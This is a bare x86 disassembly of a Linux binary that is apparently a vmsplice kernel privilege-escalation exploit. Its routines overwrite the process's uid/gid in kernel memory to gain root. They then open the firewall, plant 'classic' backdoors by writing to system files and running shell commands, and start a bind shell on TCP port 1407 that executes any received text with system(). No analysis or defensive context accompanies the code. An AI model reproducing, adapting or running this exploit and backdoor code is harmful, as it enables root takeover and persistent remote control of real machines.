push   ebp
mov    ebp,esp
sub    esp,0x8
call   8048904 <call_gmon_start>
call   8048960 <frame_dummy>
call   80494c0 <__do_global_ctors_aux>
leave  
ret    
push   DWORD PTR ds:0x804a988
jmp    DWORD PTR ds:0x804a98c
add    BYTE PTR [eax],al
jmp    DWORD PTR ds:0x804a990
push   0x0
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a994
push   0x8
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a998
push   0x10
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a99c
push   0x18
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9a0
push   0x20
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9a4
push   0x28
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9a8
push   0x30
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9ac
push   0x38
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9b0
push   0x40
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9b4
push   0x48
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9b8
push   0x50
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9bc
push   0x58
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9c0
push   0x60
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9c4
push   0x68
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9c8
push   0x70
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9cc
push   0x78
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9d0
push   0x80
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9d4
push   0x88
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9d8
push   0x90
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9dc
push   0x98
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9e0
push   0xa0
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9e4
push   0xa8
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9e8
push   0xb0
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9ec
push   0xb8
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9f0
push   0xc0
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9f4
push   0xc8
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9f8
push   0xd0
jmp    8048708 <.plt>
jmp    DWORD PTR ds:0x804a9fc
push   0xd8
jmp    8048708 <.plt>
xor    ebp,ebp
pop    esi
mov    ecx,esp
and    esp,0xfffffff0
push   eax
push   esp
push   edx
push   0x8049450
push   0x8049460
push   ecx
push   esi
push   0x80490a3
call   80487f8 <__libc_start_main@plt>
hlt    
nop
nop
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x4
call   8048910 <call_gmon_start+0xc>
pop    ebx
add    ebx,0x2074
mov    edx,DWORD PTR [ebx-0x4]
test   edx,edx
je     8048926 <call_gmon_start+0x22>
call   80488c8 <__gmon_start__@plt>
pop    eax
pop    ebx
leave  
ret    
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
cmp    BYTE PTR ds:0x804aa28,0x0
je     804894b <__do_global_dtors_aux+0x1b>
jmp    804895d <__do_global_dtors_aux+0x2d>
add    eax,0x4
mov    ds:0x804aa08,eax
call   edx
mov    eax,ds:0x804aa08
mov    edx,DWORD PTR [eax]
test   edx,edx
jne    8048941 <__do_global_dtors_aux+0x11>
mov    BYTE PTR ds:0x804aa28,0x1
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    eax,ds:0x804a8b4
test   eax,eax
je     8048981 <frame_dummy+0x21>
mov    eax,0x0
test   eax,eax
je     8048981 <frame_dummy+0x21>
mov    DWORD PTR [esp],0x804a8b4
call   eax
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x18
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8048758 <strerror@plt>
mov    DWORD PTR [ebp-0x8],eax
cmp    DWORD PTR [ebp+0xc],0x0
je     80489a7 <die+0x23>
mov    DWORD PTR [ebp-0x4],0x8049510
jmp    80489ae <die+0x2a>
mov    DWORD PTR [ebp-0x4],0x804951c
mov    eax,DWORD PTR [ebp-0x8]
mov    DWORD PTR [esp+0x8],eax
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x4]
mov    DWORD PTR [esp],eax
call   8048808 <printf@plt>
mov    eax,ds:0x804aa20
mov    DWORD PTR [esp],eax
call   8048748 <fflush@plt>
mov    eax,ds:0x804aa24
mov    DWORD PTR [esp],eax
call   8048748 <fflush@plt>
mov    DWORD PTR [esp],0x1
call   8048858 <exit@plt>
push   ebp
mov    ebp,esp
push   esi
push   ebx
sub    esp,0x10
mov    ecx,DWORD PTR [ebp+0xc]
mov    edx,DWORD PTR [ebp+0x10]
mov    esi,DWORD PTR [ebp+0x14]
mov    eax,0x13c
mov    ebx,DWORD PTR [ebp+0x8]
int    0x80
mov    DWORD PTR [ebp-0xc],eax
mov    eax,DWORD PTR [ebp-0xc]
cmp    eax,0xffffff7e
jbe    8048a28 <_vmsplice+0x3b>
call   8048788 <__errno_location@plt>
mov    edx,DWORD PTR [ebp-0xc]
neg    edx
mov    DWORD PTR [eax],edx
mov    DWORD PTR [ebp-0xc],0xffffffff
mov    eax,DWORD PTR [ebp-0xc]
add    esp,0x10
pop    ebx
pop    esi
pop    ebp
ret    
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x10
mov    eax,esp
and    eax,0xffffe000
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [ebp-0x8],eax
mov    eax,DWORD PTR [ebp-0x8]
mov    DWORD PTR [ebp-0xc],eax
mov    DWORD PTR [ebp-0x10],0x0
jmp    8048b79 <kernel_code+0x147>
mov    eax,DWORD PTR [ebp-0xc]
mov    edx,DWORD PTR [eax]
mov    eax,ds:0x804aa2c
cmp    edx,eax
jne    8048b71 <kernel_code+0x13f>
mov    eax,DWORD PTR [ebp-0xc]
add    eax,0x4
mov    edx,DWORD PTR [eax]
mov    eax,ds:0x804aa2c
cmp    edx,eax
jne    8048b71 <kernel_code+0x13f>
mov    eax,DWORD PTR [ebp-0xc]
add    eax,0x8
mov    edx,DWORD PTR [eax]
mov    eax,ds:0x804aa2c
cmp    edx,eax
jne    8048b71 <kernel_code+0x13f>
mov    eax,DWORD PTR [ebp-0xc]
add    eax,0xc
mov    edx,DWORD PTR [eax]
mov    eax,ds:0x804aa2c
cmp    edx,eax
jne    8048b71 <kernel_code+0x13f>
mov    eax,DWORD PTR [ebp-0xc]
add    eax,0x10
mov    edx,DWORD PTR [eax]
mov    eax,ds:0x804aa30
cmp    edx,eax
jne    8048b71 <kernel_code+0x13f>
mov    eax,DWORD PTR [ebp-0xc]
add    eax,0x14
mov    edx,DWORD PTR [eax]
mov    eax,ds:0x804aa30
cmp    edx,eax
jne    8048b71 <kernel_code+0x13f>
mov    eax,DWORD PTR [ebp-0xc]
add    eax,0x18
mov    edx,DWORD PTR [eax]
mov    eax,ds:0x804aa30
cmp    edx,eax
jne    8048b71 <kernel_code+0x13f>
mov    eax,DWORD PTR [ebp-0xc]
add    eax,0x1c
mov    edx,DWORD PTR [eax]
mov    eax,ds:0x804aa30
cmp    edx,eax
jne    8048b71 <kernel_code+0x13f>
mov    ecx,DWORD PTR [ebp-0xc]
add    ecx,0x4
mov    edx,DWORD PTR [ebp-0xc]
add    edx,0x8
mov    eax,DWORD PTR [ebp-0xc]
add    eax,0xc
mov    DWORD PTR [eax],0x0
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [edx],eax
mov    eax,DWORD PTR [edx]
mov    DWORD PTR [ecx],eax
mov    edx,DWORD PTR [ecx]
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [eax],edx
mov    ecx,DWORD PTR [ebp-0xc]
add    ecx,0x10
mov    ebx,DWORD PTR [ebp-0xc]
add    ebx,0x14
mov    edx,DWORD PTR [ebp-0xc]
add    edx,0x18
mov    eax,DWORD PTR [ebp-0xc]
add    eax,0x1c
mov    DWORD PTR [eax],0x0
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [edx],eax
mov    eax,DWORD PTR [edx]
mov    DWORD PTR [ebx],eax
mov    eax,DWORD PTR [ebx]
mov    DWORD PTR [ecx],eax
mov    eax,DWORD PTR [ebp-0xc]
add    eax,0x24
mov    DWORD PTR [ebp-0xc],eax
mov    edx,DWORD PTR [ebp-0xc]
add    edx,0x4
mov    eax,DWORD PTR [ebp-0xc]
add    eax,0x8
mov    DWORD PTR [eax],0xffffffff
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [edx],eax
mov    edx,DWORD PTR [edx]
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [eax],edx
jmp    8048b86 <kernel_code+0x154>
add    DWORD PTR [ebp-0xc],0x4
add    DWORD PTR [ebp-0x10],0x1
cmp    DWORD PTR [ebp-0x10],0x3f2
jle    8048a57 <kernel_code+0x25>
mov    edx,0x814aa18
mov    eax,0x8049063
mov    DWORD PTR [esp+0x10],0x7b
mov    DWORD PTR [esp+0xc],edx
mov    DWORD PTR [esp+0x8],0x246
mov    DWORD PTR [esp+0x4],0x73
mov    DWORD PTR [esp],eax
iret   
add    esp,0x10
pop    ebx
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0x28
mov    DWORD PTR [esp+0x4],0x8049524
mov    DWORD PTR [esp],0x8049527
call   8048878 <fopen@plt>
mov    DWORD PTR [ebp-0x10],eax
cmp    DWORD PTR [ebp-0x10],0x0
jne    8048be5 <classic_backdoors+0x2f>
mov    DWORD PTR [ebp-0x14],0x1
jmp    8048e87 <classic_backdoors+0x2d1>
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],0xd
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x804953a
call   8048898 <fwrite@plt>
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],0x2
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x8049548
call   8048898 <fwrite@plt>
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],0x16
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x804954b
call   8048898 <fwrite@plt>
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],0x10
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x8049562
call   8048898 <fwrite@plt>
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],0xb
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x8049573
call   8048898 <fwrite@plt>
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],0xe
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x804957f
call   8048898 <fwrite@plt>
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],0xd
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x804958e
call   8048898 <fwrite@plt>
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],0x14
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x804959c
call   8048898 <fwrite@plt>
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],0x2
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x80495b1
call   8048898 <fwrite@plt>
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp],eax
call   8048838 <fclose@plt>
mov    DWORD PTR [esp+0x4],0x80495b4
mov    DWORD PTR [esp],0x80495b7
call   8048878 <fopen@plt>
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0x0
jne    8048d54 <classic_backdoors+0x19e>
mov    DWORD PTR [ebp-0x14],0x1
jmp    8048e87 <classic_backdoors+0x2d1>
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],0xf
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x80495c5
call   8048898 <fwrite@plt>
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [esp],eax
call   8048838 <fclose@plt>
mov    DWORD PTR [esp],0x80495d5
call   80487a8 <system@plt>
mov    DWORD PTR [esp],0x80495ed
call   80487a8 <system@plt>
mov    DWORD PTR [esp+0x4],0x80495b4
mov    DWORD PTR [esp],0x80495fe
call   8048878 <fopen@plt>
mov    DWORD PTR [ebp-0x8],eax
cmp    DWORD PTR [ebp-0x8],0x0
jne    8048dc3 <classic_backdoors+0x20d>
mov    DWORD PTR [ebp-0x14],0x1
jmp    8048e87 <classic_backdoors+0x2d1>
mov    eax,DWORD PTR [ebp-0x8]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],0x17
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x804960a
call   8048898 <fwrite@plt>
mov    eax,DWORD PTR [ebp-0x8]
mov    DWORD PTR [esp],eax
call   8048838 <fclose@plt>
mov    DWORD PTR [esp+0x4],0x80495b4
mov    DWORD PTR [esp],0x8049622
call   8048878 <fopen@plt>
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
jne    8048e17 <classic_backdoors+0x261>
mov    DWORD PTR [ebp-0x14],0x1
jmp    8048e87 <classic_backdoors+0x2d1>
mov    eax,DWORD PTR [ebp-0x4]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],0x3f
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x8049630
call   8048898 <fwrite@plt>
mov    eax,DWORD PTR [ebp-0x4]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],0x6f
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x8049670
call   8048898 <fwrite@plt>
mov    eax,DWORD PTR [ebp-0x4]
mov    DWORD PTR [esp],eax
call   8048838 <fclose@plt>
mov    DWORD PTR [esp],0x80496e0
call   80487a8 <system@plt>
mov    DWORD PTR [esp],0x8049710
call   80487a8 <system@plt>
mov    DWORD PTR [ebp-0x14],0x0
mov    eax,DWORD PTR [ebp-0x14]
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    DWORD PTR [esp],0x8049798
call   80487a8 <system@plt>
mov    DWORD PTR [esp],0x80497bb
call   80487a8 <system@plt>
mov    DWORD PTR [esp],0x80497d8
call   80487a8 <system@plt>
mov    DWORD PTR [esp],0x8049814
call   80487a8 <system@plt>
mov    eax,0x0
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
push   esi
sub    esp,0x150
mov    DWORD PTR [esp+0x8],0x0
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x2
call   80488a8 <socket@plt>
mov    DWORD PTR [ebp-0x14],eax
cmp    DWORD PTR [ebp-0x14],0xffffffff
jne    8048f11 <basic_backdoor+0x48>
mov    DWORD PTR [esp],0x804984f
call   8048728 <perror@plt>
mov    DWORD PTR [esp],0x0
call   8048858 <exit@plt>
lea    eax,[ebp-0x34]
mov    DWORD PTR [eax],0x0
mov    DWORD PTR [eax+0x4],0x0
mov    DWORD PTR [eax+0x8],0x0
mov    DWORD PTR [eax+0xc],0x0
mov    WORD PTR [ebp-0x34],0x2
mov    DWORD PTR [esp],0x57f
call   8048868 <htons@plt>
mov    WORD PTR [ebp-0x32],ax
mov    DWORD PTR [ebp-0x30],0x0
mov    DWORD PTR [ebp-0x38],0x10
mov    eax,DWORD PTR [ebp-0x38]
mov    edx,eax
lea    eax,[ebp-0x34]
mov    DWORD PTR [esp+0x8],edx
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [esp],eax
call   8048818 <bind@plt>
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0xffffffff
jne    8048f8f <basic_backdoor+0xc6>
mov    DWORD PTR [esp],0x8049856
call   8048728 <perror@plt>
mov    DWORD PTR [esp],0x0
call   8048858 <exit@plt>
mov    DWORD PTR [esp+0x4],0x5
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [esp],eax
call   80487b8 <listen@plt>
lea    edx,[ebp-0x38]
lea    eax,[ebp-0x24]
mov    DWORD PTR [esp+0x8],edx
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [esp],eax
call   8048798 <accept@plt>
mov    DWORD PTR [ebp-0x10],eax
cmp    DWORD PTR [ebp-0x10],0xffffffff
jne    8048fdc <basic_backdoor+0x113>
mov    DWORD PTR [esp],0x804985b
call   8048728 <perror@plt>
mov    DWORD PTR [esp],0x0
call   8048858 <exit@plt>
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0xfa
lea    eax,[ebp-0x132]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp],eax
call   8048888 <recv@plt>
lea    eax,[ebp-0x132]
mov    DWORD PTR [esp],eax
call   80487a8 <system@plt>
lea    eax,[ebp-0x132]
mov    DWORD PTR [ebp-0x13c],eax
mov    DWORD PTR [ebp-0x140],0x8049862
mov    DWORD PTR [ebp-0x144],0x5
cld    
mov    esi,DWORD PTR [ebp-0x13c]
mov    edi,DWORD PTR [ebp-0x140]
mov    ecx,DWORD PTR [ebp-0x144]
repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
seta   dl
setb   al
mov    ecx,edx
sub    cl,al
mov    eax,ecx
movsx  eax,al
test   eax,eax
jne    8048fdc <basic_backdoor+0x113>
mov    DWORD PTR [esp],0x0
call   8048858 <exit@plt>
push   ebp
mov    ebp,esp
sub    esp,0x8
call   8048828 <getuid@plt>
test   eax,eax
je     8049086 <exit_code+0x23>
mov    DWORD PTR [esp+0x4],0x0
mov    DWORD PTR [esp],0x8049867
call   8048984 <die>
mov    DWORD PTR [esp],0x804986b
call   8048778 <putenv@plt>
call   8048e8c <open_firewall>
call   8048bb6 <classic_backdoors>
call   8048ec9 <basic_backdoor>
leave  
ret    
lea    ecx,[esp+0x4]
and    esp,0xfffffff0
push   DWORD PTR [ecx-0x4]
push   ebp
mov    ebp,esp
push   edi
push   ecx
sub    esp,0x60
call   8048828 <getuid@plt>
mov    ds:0x804aa2c,eax
call   8048848 <getgid@plt>
mov    ds:0x804aa30,eax
mov    eax,ds:0x804aa2c
mov    edx,DWORD PTR ds:0x804aa2c
mov    ecx,DWORD PTR ds:0x804aa2c
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],edx
mov    DWORD PTR [esp],ecx
call   80487e8 <setresuid@plt>
mov    eax,ds:0x804aa30
mov    edx,DWORD PTR ds:0x804aa30
mov    ecx,DWORD PTR ds:0x804aa30
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],edx
mov    DWORD PTR [esp],ecx
call   80488b8 <setresgid@plt>
mov    eax,ds:0x804aa2c
test   eax,eax
je     804911d <main+0x7a>
mov    eax,ds:0x804aa30
test   eax,eax
jne    8049131 <main+0x8e>
mov    DWORD PTR [esp+0x4],0x0
mov    DWORD PTR [esp],0x804987e
call   8048984 <die>
mov    DWORD PTR [ebp-0x20],0x0
mov    DWORD PTR [ebp-0x1c],0x1000
lea    eax,[ebp-0x20]
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [ebp-0x44],eax
mov    eax,DWORD PTR [ebp-0x44]
add    eax,0x20
mov    DWORD PTR [ebp-0x40],eax
mov    DWORD PTR [ebp-0x10],0x1000
mov    edx,DWORD PTR [ebp-0x44]
mov    DWORD PTR [esp+0x14],0x0
mov    DWORD PTR [esp+0x10],0xffffffff
mov    DWORD PTR [esp+0xc],0x32
mov    DWORD PTR [esp+0x8],0x3
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   8048768 <mmap@plt>
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0xffffffff
jne    80491a9 <main+0x106>
call   8048788 <__errno_location@plt>
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],0x8049883
call   8048984 <die>
mov    eax,DWORD PTR [ebp-0xc]
mov    edx,DWORD PTR [ebp-0x10]
mov    edi,eax
cld    
mov    ecx,edx
mov    eax,0x0
rep stos BYTE PTR es:[edi],al
mov    eax,DWORD PTR [ebp-0x44]
mov    DWORD PTR [eax],0x4000
mov    edx,DWORD PTR [ebp-0x44]
mov    eax,DWORD PTR [ebp-0x44]
mov    DWORD PTR [edx+0xc],eax
mov    eax,DWORD PTR [ebp-0x44]
mov    DWORD PTR [eax+0x4],0x1
mov    edx,DWORD PTR [ebp-0x40]
mov    eax,0x8048a32
mov    DWORD PTR [edx+0x18],eax
mov    eax,DWORD PTR [ebp-0x44]
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [ebp-0x3c],eax
mov    eax,DWORD PTR [ebp-0x3c]
add    eax,0x20
mov    DWORD PTR [ebp-0x38],eax
mov    DWORD PTR [ebp-0x10],0x1000
mov    edx,DWORD PTR [ebp-0x3c]
mov    DWORD PTR [esp+0x14],0x0
mov    DWORD PTR [esp+0x10],0xffffffff
mov    DWORD PTR [esp+0xc],0x32
mov    DWORD PTR [esp+0x8],0x3
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   8048768 <mmap@plt>
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0xffffffff
jne    804924c <main+0x1a9>
call   8048788 <__errno_location@plt>
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],0x8049883
call   8048984 <die>
mov    eax,DWORD PTR [ebp-0xc]
mov    edx,DWORD PTR [ebp-0x10]
mov    edi,eax
cld    
mov    ecx,edx
mov    eax,0x0
rep stos BYTE PTR es:[edi],al
mov    eax,DWORD PTR [ebp-0x3c]
mov    DWORD PTR [eax],0x4000
mov    edx,DWORD PTR [ebp-0x3c]
mov    eax,DWORD PTR [ebp-0x3c]
mov    DWORD PTR [edx+0xc],eax
mov    eax,DWORD PTR [ebp-0x3c]
mov    DWORD PTR [eax+0x4],0x1
mov    edx,DWORD PTR [ebp-0x38]
mov    eax,0x8048a32
mov    DWORD PTR [edx+0x18],eax
mov    DWORD PTR [ebp-0x18],0x1000
mov    DWORD PTR [ebp-0x14],0x0
lea    eax,[ebp-0x18]
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [ebp-0x34],eax
mov    DWORD PTR [ebp-0x10],0x1000
mov    edx,DWORD PTR [ebp-0x34]
mov    DWORD PTR [esp+0x14],0x0
mov    DWORD PTR [esp+0x10],0xffffffff
mov    DWORD PTR [esp+0xc],0x32
mov    DWORD PTR [esp+0x8],0x3
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   8048768 <mmap@plt>
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0xffffffff
jne    80492f4 <main+0x251>
call   8048788 <__errno_location@plt>
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],0x8049883
call   8048984 <die>
mov    eax,DWORD PTR [ebp-0xc]
mov    edx,DWORD PTR [ebp-0x10]
mov    edi,eax
cld    
mov    ecx,edx
mov    eax,0x0
rep stos BYTE PTR es:[edi],al
mov    DWORD PTR [ebp-0x10],0x32000
mov    DWORD PTR [esp+0x14],0x0
mov    DWORD PTR [esp+0x10],0xffffffff
mov    DWORD PTR [esp+0xc],0x22
mov    DWORD PTR [esp+0x8],0x3
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],0x0
call   8048768 <mmap@plt>
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0xffffffff
jne    8049360 <main+0x2bd>
call   8048788 <__errno_location@plt>
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],0x8049883
call   8048984 <die>
mov    eax,DWORD PTR [ebp-0xc]
mov    edx,DWORD PTR [ebp-0x10]
mov    edi,eax
cld    
mov    ecx,edx
mov    eax,0x0
rep stos BYTE PTR es:[edi],al
sub    DWORD PTR [ebp-0x10],0x2000
mov    eax,DWORD PTR [ebp-0x10]
add    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [esp+0x4],0x1000
mov    DWORD PTR [esp],eax
call   80487c8 <munmap@plt>
test   eax,eax
jns    80493aa <main+0x307>
call   8048788 <__errno_location@plt>
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],0x8049888
call   8048984 <die>
lea    eax,[ebp-0x28]
mov    DWORD PTR [esp],eax
call   80487d8 <pipe@plt>
test   eax,eax
jns    80493d0 <main+0x32d>
call   8048788 <__errno_location@plt>
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],0x804988f
call   8048984 <die>
mov    eax,DWORD PTR [ebp-0x28]
mov    DWORD PTR [esp],eax
call   8048718 <close@plt>
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [ebp-0x30],eax
mov    DWORD PTR [ebp-0x2c],0xffffffff
mov    DWORD PTR [esp+0x4],0x8049063
mov    DWORD PTR [esp],0xd
call   8048738 <signal@plt>
mov    edx,DWORD PTR [ebp-0x24]
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0x1
lea    eax,[ebp-0x30]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   80489ed <_vmsplice>
call   8048788 <__errno_location@plt>
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],0x8049894
call   8048984 <die>
mov    eax,0x0
add    esp,0x60
pop    ecx
pop    edi
pop    ebp
lea    esp,[ecx-0x4]
ret    
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
pop    ebp
ret    
lea    esi,[esi+eiz*1+0x0]
lea    edi,[edi+eiz*1+0x0]
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
call   80494bc <__i686.get_pc_thunk.bx>
add    ebx,0x1519
sub    esp,0x1c
call   80486f0 <_init>
lea    eax,[ebx-0xe0]
lea    edx,[ebx-0xe0]
sub    eax,edx
sar    eax,0x2
mov    DWORD PTR [ebp-0x10],eax
je     80494b4 <__libc_csu_init+0x54>
xor    edi,edi
mov    esi,edx
mov    eax,DWORD PTR [ebp+0x10]
add    edi,0x1
mov    DWORD PTR [esp+0x8],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   DWORD PTR [esi]
add    esi,0x4
cmp    DWORD PTR [ebp-0x10],edi
jne    8049493 <__libc_csu_init+0x33>
add    esp,0x1c
pop    ebx
pop    esi
pop    edi
pop    ebp
ret    
mov    ebx,DWORD PTR [esp]
ret    
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x4
mov    eax,ds:0x804a8a4
cmp    eax,0xffffffff
je     80494e3 <__do_global_ctors_aux+0x23>
xor    ebx,ebx
call   eax
mov    eax,DWORD PTR [ebx+0x804a8a0]
sub    ebx,0x4
cmp    eax,0xffffffff
jne    80494d3 <__do_global_ctors_aux+0x13>
add    esp,0x4
pop    ebx
pop    ebp
ret    
nop
nop
nop
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x4
call   80494f8 <_fini+0xc>
pop    ebx
add    ebx,0x148c
call   8048930 <__do_global_dtors_aux>
pop    ecx
pop    ebx
leave  
ret    
